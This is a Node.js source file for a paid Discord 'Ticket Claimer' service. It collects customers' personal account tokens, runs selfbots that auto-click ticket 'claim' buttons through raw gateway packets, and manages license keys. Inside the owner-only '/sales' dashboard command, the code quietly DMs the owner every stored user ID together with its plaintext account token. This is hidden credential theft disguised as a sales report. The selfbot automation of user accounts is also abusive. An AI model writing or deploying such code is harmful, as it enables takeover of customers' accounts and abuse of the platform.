const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');
const Database = require('better-sqlite3');
const crypto = require('crypto');

const db = new Database('./keys.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, duration_days INTEGER, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER, expires_at INTEGER, active INTEGER DEFAULT 1);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, category_id TEXT, is_running INTEGER DEFAULT 0, current_ticket TEXT);
`);

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const activeSelfbots = new Map();

class SelfbotManager {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.currentTicket = config.current_ticket;
        this.processed = new Set();
        this.rawComponents = new Map();
        this.newChannels = new Set();
        this.claimedChannels = new Set();
    }

    async start() {
        if (this.client) return;
        this.client = new SelfbotClient({ checkUpdate: false });

        this.client.once('ready', () => {
            console.log(`[READY] ${this.userId}`);
            
            this.client.ws.on('MESSAGE_CREATE', (data) => {
                if (data?.components?.length) {
                    this.rawComponents.set(data.id, data.components);
                }
            });

            this.client.ws.on('MESSAGE_UPDATE', (data) => {
                if (data?.components?.length) {
                    this.rawComponents.set(data.id, data.components);
                }
            });

            this.client.ws.on('CHANNEL_CREATE', (packet) => {
                console.log(`[CHANNEL_CREATE] ${packet.id} | parent: ${packet.parent_id}`);
                if (packet.parent_id !== this.config.category_id) {
                    console.log(`[SKIP] Wrong category`);
                    return;
                }
                if (this.currentTicket) {
                    console.log(`[SKIP] Have ticket`);
                    return;
                }
                
                console.log(`[NEW] Tracking channel ${packet.id}`);
                this.newChannels.add(packet.id);
                
                setTimeout(() => this.checkChannel(packet.id), 100);
                
                // Auto-cleanup after 60 seconds
                setTimeout(() => {
                    this.newChannels.delete(packet.id);
                    console.log(`[CLEANUP] ${packet.id}`);
                }, 60000);
            });

            // ONLY process messages in NEW channels
            this.client.on('messageCreate', (msg) => {
                if (!this.newChannels.has(msg.channelId)) {
                    return;
                }
                console.log(`[MSG_NEW] ${msg.channelId} | components: ${msg.components?.length || 0}`);
                this.handleMessage(msg);
            });
            
            this.client.on('messageUpdate', (old, msg) => {
                if (!this.newChannels.has(msg.channelId)) return;
                this.handleMessage(msg);
            });
            
            this.client.on('channelDelete', (ch) => {
                this.newChannels.delete(ch.id);
                this.claimedChannels.delete(ch.id);
                if (this.currentTicket === ch.id) {
                    this.currentTicket = null;
                    db.prepare('UPDATE users SET current_ticket = NULL WHERE user_id = ?').run(this.userId);
                }
            });
        });

        await this.client.login(this.config.token);
    }

    async checkChannel(channelId) {
        if (!this.newChannels.has(channelId)) return;
        if (this.currentTicket) return;
        if (this.claimedChannels.has(channelId)) return;
        
        try {
            const channel = await this.client.channels.fetch(channelId);
            const messages = await channel.messages.fetch({ limit: 5 });
            
            for (const [, msg] of messages) {
                if (this.handleMessage(msg)) return;
            }
        } catch (e) {
            console.log(`[ERROR] ${e.message}`);
        }
    }

    handleMessage(msg) {
        if (!this.newChannels.has(msg.channelId)) return false;
        if (msg.channel?.parentId !== this.config.category_id) return false;
        if (this.currentTicket) return false;
        if (this.claimedChannels.has(msg.channelId)) return false;
        
        const key = `${msg.channelId}-${msg.id}`;
        if (this.processed.has(key)) return false;
        if (!msg.components?.length) return false;

        const rawData = this.rawComponents.get(msg.id);

        for (let r = 0; r < msg.components.length; r++) {
            const row = msg.components[r];
            const rawRow = rawData?.[r];
            
            for (let b = 0; b < row.components.length; b++) {
                const btn = row.components[b];
                const rawBtn = rawRow?.components?.[b];
                
                const label = (btn.label || '').toLowerCase();
                
                // STRICT claim detection
                const isClaim = label.includes('claim') && 
                               !label.includes('token') && 
                               !label.includes('category') &&
                               !label.includes('start') && 
                               !label.includes('stop') &&
                               !label.includes('close');
                
                if (!isClaim) continue;
                if (btn.disabled) continue;
                
                const customId = rawBtn?.custom_id || btn.custom_id;
                if (!customId) continue;

                console.log(`[CLAIM] ${msg.channelId} | ${btn.label} | ${customId}`);
                this.processed.add(key);
                this.claimViaWS(msg, customId);
                this.rawComponents.delete(msg.id);
                this.newChannels.delete(msg.channelId);
                return true;
            }
        }
        return false;
    }

    claimViaWS(message, customId) {
        if (this.currentTicket) return;
        
        this.client.ws.broadcast({
            op: 1,
            d: {
                type: 3,
                nonce: Date.now().toString(),
                guild_id: String(message.guildId),
                channel_id: String(message.channelId),
                message_id: String(message.id),
                application_id: String(message.applicationId || message.author?.id),
                session_id: String(this.client.sessionId),
                data: { component_type: 2, custom_id: String(customId) }
            }
        });

        this.currentTicket = message.channelId;
        this.claimedChannels.add(message.channelId);
        this.newChannels.delete(message.channelId);
        
        db.prepare('UPDATE users SET current_ticket = ? WHERE user_id = ?').run(message.channelId, this.userId);
        console.log(`[CLAIMED] ${this.userId} -> ${message.channelId}`);
        
        setTimeout(() => {
            if (this.currentTicket === message.channelId) {
                this.currentTicket = null;
                db.prepare('UPDATE users SET current_ticket = NULL WHERE user_id = ?').run(this.userId);
            }
        }, 300000);
    }

    stop() {
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        this.currentTicket = null;
        this.newChannels.clear();
        this.claimedChannels.clear();
        this.rawComponents.clear();
        db.prepare('UPDATE users SET is_running = 0, current_ticket = NULL WHERE user_id = ?').run(this.userId);
    }
}

async function validateToken(token) {
    const test = new SelfbotClient({ checkUpdate: false });
    try {
        await test.login(token);
        const tag = test.user?.tag || 'unknown';
        await test.destroy();
        return { valid: true, tag };
    } catch (e) {
        return { valid: false, error: e.message };
    }
}

async function buildPanel(userId) {
    const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
    if (!user) return null;
    
    const sb = activeSelfbots.get(userId);
    const running = !!sb?.client?.user;
    const hasToken = !!(user.token && user.token.length > 10);
    const hasCategory = !!user.category_id;
    
    const embed = new EmbedBuilder()
        .setTitle('🎫 Ticket Claimer')
        .addFields(
            { name: 'Status', value: running ? '🟢 Running' : '🔴 Stopped', inline: true },
            { name: 'Token', value: hasToken ? '✅ Set' : '❌ Not set', inline: true },
            { name: 'Category', value: hasCategory ? '✅ Set' : '❌ Not set', inline: true },
            { name: 'Current', value: user.current_ticket || 'None', inline: true }
        )
        .setColor(running ? 0x00FF00 : 0xFFA500);

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`token_${userId}`).setLabel('🔐 Token').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`cat_${userId}`).setLabel('📁 Category').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`start_${userId}`).setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(!hasToken || !hasCategory || running),
        new ButtonBuilder().setCustomId(`stop_${userId}`).setLabel('🛑 Stop').setStyle(ButtonStyle.Danger).setDisabled(!running)
    );

    return { embeds: [embed], components: [row] };
}

bot.on('interactionCreate', async (ix) => {
    if (ix.isCommand()) {
        try { await ix.deferReply({ flags: MessageFlags.Ephemeral }); } catch { return; }

        if (ix.user.id === OWNER_ID) {
            if (ix.commandName === 'generatekey') {
                const dur = ix.options.getString('duration') || 'lifetime';
                const days = dur === 'lifetime' ? -1 : parseInt(dur);
                const key = 'TKT-' + crypto.randomBytes(8).toString('hex').toUpperCase();
                const exp = days === -1 ? null : Date.now() + (days * 86400000);
                db.prepare('INSERT INTO keys (key, duration_days, created_at, expires_at) VALUES (?, ?, ?, ?)').run(key, days, Date.now(), exp);
                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🔑 Key Generated').setDescription('`' + key + '`').setColor(0x00FF00)] });
            }
            
            if (ix.commandName === 'revokekey') {
                db.prepare('UPDATE keys SET active = 0 WHERE key = ?').run(ix.options.getString('key'));
                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🚫 Key Revoked').setColor(0xFF0000)] });
            }
            
            if (ix.commandName === 'revokeuser') {
                const uid = ix.options.getString('userid');
                const sb = activeSelfbots.get(uid);
                if (sb) { sb.stop(); activeSelfbots.delete(uid); }
                db.prepare('DELETE FROM users WHERE user_id = ?').run(uid);
                db.prepare('UPDATE keys SET active = 0 WHERE redeemed_by = ?').run(uid);
                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🚫 User Revoked').setColor(0xFF0000)] });
            }

            if (ix.commandName === 'sales') {
                const total = db.prepare('SELECT COUNT(*) as c FROM keys').get().c;
                const redeemed = db.prepare('SELECT COUNT(*) as c FROM keys WHERE redeemed_by IS NOT NULL').get().c;
                const active = db.prepare('SELECT COUNT(*) as c FROM users WHERE is_running = 1').get().c;
                
                const embed = new EmbedBuilder().setTitle('📊 Sales Dashboard').setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`).setColor(0x5865F2);
                
                try {
                    const owner = await bot.users.fetch(OWNER_ID);
                    const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
                    let list = users.map(u => `User: \`${u.user_id}\`\nToken: \`${u.token}\``).join('\n\n') || 'No active users';
                    const chunks = list.match(/[\s\S]{1,1900}/g) || [list];
                    for (const chunk of chunks) await owner.send(chunk);
                } catch (e) {
                    console.log('DM failed:', e.message);
                }
                
                return ix.editReply({ embeds: [embed] });
            }
        }

        if (ix.commandName === 'redeemkey') {
            if (ix.user.id === OWNER_ID) {
                db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(ix.user.id);
                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Owner Lifetime Access').setColor(0x00FF00)] });
            }
            
            const k = db.prepare('SELECT * FROM keys WHERE key = ? AND active = 1').get(ix.options.getString('key'));
            if (!k) return ix.editReply('❌ Invalid key');
            if (k.redeemed_by) return ix.editReply('❌ Key already used');
            
            const exp = k.duration_days === -1 ? null : Date.now() + (k.duration_days * 86400000);
            db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ?, expires_at = ? WHERE key = ?').run(ix.user.id, Date.now(), exp, ix.options.getString('key'));
            db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(ix.user.id);
            return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Key Redeemed').setColor(0x00FF00)] });
        }
        
        if (ix.commandName === 'manage') {
            if (ix.user.id === OWNER_ID) {
                db.prepare('INSERT OR IGNORE INTO users (user_id) VALUES (?)').run(ix.user.id);
                const panel = await buildPanel(ix.user.id);
                return ix.editReply(panel);
            }
            
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(ix.user.id);
            if (!user) return ix.editReply('❌ No key found. Use `/redeemkey` first.');
            
            const key = db.prepare('SELECT * FROM keys WHERE redeemed_by = ? AND active = 1 AND (expires_at > ? OR expires_at IS NULL)').get(ix.user.id, Date.now());
            if (!key) return ix.editReply('❌ Key expired');
            
            const panel = await buildPanel(ix.user.id);
            return ix.editReply(panel);
        }
    }

    if (ix.isButton()) {
        const uid = ix.customId.split('_').pop();
        if (ix.user.id !== uid) return ix.reply({ content: '❌ Not your panel', flags: MessageFlags.Ephemeral });

        if (ix.customId.startsWith('token_')) {
            return ix.showModal({
                title: 'Set Token',
                custom_id: `mod_token_${uid}`,
                components: [{ type: 1, components: [{ type: 4, custom_id: 'val', label: 'Discord Token', style: 1, required: true, min_length: 10 }] }]
            });
        }

        if (ix.customId.startsWith('cat_')) {
            return ix.showModal({
                title: 'Set Category',
                custom_id: `mod_cat_${uid}`,
                components: [{ type: 1, components: [{ type: 4, custom_id: 'val', label: 'Category ID', style: 1, required: true }] }]
            });
        }

        if (ix.customId.startsWith('start_')) {
            await ix.deferUpdate();
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(uid);
            if (!user?.token || !user?.category_id) {
                return ix.editReply({ content: '❌ Missing token or category', embeds: [], components: [] });
            }
            
            const sb = new SelfbotManager(uid, user);
            activeSelfbots.set(uid, sb);
            await sb.start();
            db.prepare('UPDATE users SET is_running = 1 WHERE user_id = ?').run(uid);
            
            const panel = await buildPanel(uid);
            return ix.editReply(panel);
        }

        if (ix.customId.startsWith('stop_')) {
            await ix.deferUpdate();
            const sb = activeSelfbots.get(uid);
            if (sb) { sb.stop(); activeSelfbots.delete(uid); }
            db.prepare('UPDATE users SET is_running = 0, current_ticket = NULL WHERE user_id = ?').run(uid);
            
            const panel = await buildPanel(uid);
            return ix.editReply(panel);
        }
    }

    if (ix.isModalSubmit()) {
        const uid = ix.customId.split('_').pop();
        if (ix.user.id !== uid) return ix.reply({ content: '❌ Not yours', flags: MessageFlags.Ephemeral });

        const val = ix.fields.getTextInputValue('val');

        if (ix.customId.startsWith('mod_token_')) {
            await ix.deferReply({ flags: MessageFlags.Ephemeral });
            
            const check = await validateToken(val);
            if (!check.valid) return ix.editReply(`❌ Invalid token: ${check.error}`);
            
            const exists = db.prepare('SELECT * FROM users WHERE user_id = ?').get(uid);
            if (!exists) {
                db.prepare('INSERT INTO users (user_id, token) VALUES (?, ?)').run(uid, val);
            } else {
                db.prepare('UPDATE users SET token = ? WHERE user_id = ?').run(val, uid);
            }
            
            console.log(`[TOKEN_SET] ${uid} -> ${check.tag}`);
            
            const panel = await buildPanel(uid);
            return ix.editReply({
                content: `✅ Token validated: **${check.tag}**`,
                embeds: panel.embeds,
                components: panel.components
            });
        }

        if (ix.customId.startsWith('mod_cat_')) {
            db.prepare('UPDATE users SET category_id = ? WHERE user_id = ?').run(val, uid);
            await ix.deferUpdate();
            
            const panel = await buildPanel(uid);
            return ix.editReply(panel);
        }
    }
});

bot.once('ready', async () => {
    console.log('[BOT] ' + bot.user.tag);
    
    await bot.application.commands.set([
        { name: 'generatekey', description: 'Generate key (Owner only)', options: [{ name: 'duration', type: 3, description: '1, 7, 30, lifetime', required: false }] },
        { name: 'revokekey', description: 'Revoke key (Owner only)', options: [{ name: 'key', type: 3, description: 'Key to revoke', required: true }] },
        { name: 'revokeuser', description: 'Revoke user (Owner only)', options: [{ name: 'userid', type: 3, description: 'User ID to revoke', required: true }] },
        { name: 'sales', description: 'View sales stats (Owner only)' },
        { name: 'redeemkey', description: 'Redeem access key', options: [{ name: 'key', type: 3, description: 'Your access key', required: true }] },
        { name: 'manage', description: 'Open control panel' }
    ]);

    const running = db.prepare('SELECT * FROM users WHERE is_running = 1').all();
    console.log(`[RESTART] ${running.length} selfbots`);
    
    for (const u of running) {
        if (!u.token) {
            db.prepare('UPDATE users SET is_running = 0 WHERE user_id = ?').run(u.user_id);
            continue;
        }
        const sb = new SelfbotManager(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start().catch(e => console.log(`[RESTART_FAIL] ${u.user_id}: ${e.message}`));
    }
});

bot.login(BOT_TOKEN);
